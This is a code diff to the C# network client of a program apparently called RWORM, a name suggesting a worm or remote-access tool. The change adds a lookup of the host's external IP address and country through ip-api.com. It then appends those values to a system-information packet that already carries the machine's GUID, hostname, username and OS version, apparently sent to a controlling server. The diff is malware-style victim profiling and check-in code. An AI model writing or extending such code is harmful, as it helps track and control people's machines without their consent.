@@ -433,10 +433,31 @@ namespace RWORM.Client.Network
         }
 
         // ── System info ────────────────────────────────────────────────────────
+        private static async Task<(string ip, string countryCode)> FetchExternalIpInfoAsync()
+        {
+            try
+            {
+                using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(4) };
+                var res = await http.GetStringAsync("http://ip-api.com/json/?fields=status,query,countryCode");
+                using var doc = JsonDocument.Parse(res);
+                var root = doc.RootElement;
+                if (root.TryGetProperty("status", out var s) && s.GetString() == "success")
+                {
+                    string ip = root.TryGetProperty("query", out var q) ? q.GetString() ?? "" : "";
+                    string cc = root.TryGetProperty("countryCode", out var c) ? c.GetString() ?? "" : "";
+                    return (ip, cc);
+                }
+            }
+            catch { }
+            return ("", "");
+        }
+
         private async Task SendSystemInfo()
         {
+            var (extIp, extCc) = await FetchExternalIpInfoAsync();
             var json = $"{{\"guid\":\"{Config.GetGuid()}\",\"hostname\":\"{Config.GetHostname()}\","
-                     + $"\"username\":\"{Config.GetUsername()}\",\"os_version\":\"{Config.GetOSVersion()}\"}}";
+                     + $"\"username\":\"{Config.GetUsername()}\",\"os_version\":\"{Config.GetOSVersion()}\","
+                     + $"\"ip_address\":\"{extIp}\",\"country_code\":\"{extCc}\"}}";
             await SendAsync(CreatePacket(0x02, 0, json));
         }
 
